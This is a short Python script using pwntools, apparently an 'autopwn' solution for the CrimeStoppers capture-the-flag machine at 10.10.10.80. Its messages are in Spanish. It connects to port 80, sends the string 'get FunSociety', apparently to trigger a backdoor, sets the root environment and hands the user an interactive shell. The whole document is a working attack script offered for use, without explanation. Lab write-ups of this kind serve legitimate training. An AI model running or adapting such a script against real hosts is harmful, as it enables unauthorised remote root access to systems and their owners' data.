try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn CrimeStoppers ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

shell = remote("10.10.10.80", 80)
time.sleep(0.5)
shell.sendline(b"get FunSociety")
time.sleep(0.3)
shell.sendline(b"export TERM=xterm HOME=/root; cd")
shell.interactive()
